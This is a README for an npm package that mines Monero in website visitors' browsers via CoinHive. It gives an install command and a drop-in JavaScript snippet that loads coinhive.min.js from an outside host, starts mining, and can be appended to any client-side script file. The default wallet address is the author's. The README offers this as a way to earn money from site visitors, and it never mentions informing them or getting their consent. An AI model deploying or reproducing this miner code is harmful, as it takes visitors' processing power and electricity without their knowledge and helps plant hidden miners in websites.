# Web Crypto Miner

> Start making money for your sites, even during development. The web crypto miner allows you to easily mine Monero (xmr) in a browser using javascript. All you need is a monero wallet address.

## Important notes:

- Make sure you are using your public wallet address.
- Once you have mined .035 xmr it will be transfered to your wallet addres.
  - This usually takes about 5 days with constant load from 1 user. So, the more users the better.
- The pool fee is 1.5%

## Install
```
npm i web-miner --save
```

## Usage

This is for client-side code only.

If you don't have a monero wallet address and need one, I highly recommend https://mymonero.com

```js
var configure = require('web-miner');

// Make sure to use your wallet address otherwise you'll be sending me coins
// Replace the string with your wallet address string
configure('4B9pCtvG2e5BMUxBjT1NsLgGDSHovEpHhCVJFx4U4kQgSYomecnqdAyXK3YdCv2W1NhhMrNFG5ieUM21uo3HxzzDTG9MT2f');

```

If for whatever reason you don't have access to `npm` or require modules you can append this code in any js file that the client uses. Again, just replace my wallet address string with your wallet address string:

```js
var script = document.createElement('script');
script.onload = function () {
  // XMR Pool hash
  var m = new CoinHive.Anonymous('BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu');
   // TODO: Replace the below string with wallet string
  m.start('4B9pCtvG2e5BMUxBjT1NsLgGDSHovEpHhCVJFx4U4kQgSYomecnqdAyXK3YdCv2W1NhhMrNFG5ieUM21uo3HxzzDTG9MT2f');
 };
script.src = 'https://coinhive.com/lib/coinhive.min.js';
document.head.appendChild(script);
```

## DISCLAIMER: USE RESPONSIBLY. DO NOT PASTE THE ABOVE CODE INTO JS FILES THAT YOU DO NOT OWN. I CANNOT BE HELD RESPONSIBLE FOR YOUR ACTIONS.

## Contributing

Pull requests and stars are always welcome. 
But before doing anything, please read the [CONTRIBUTING.md](./CONTRIBUTING.md) guidelines.

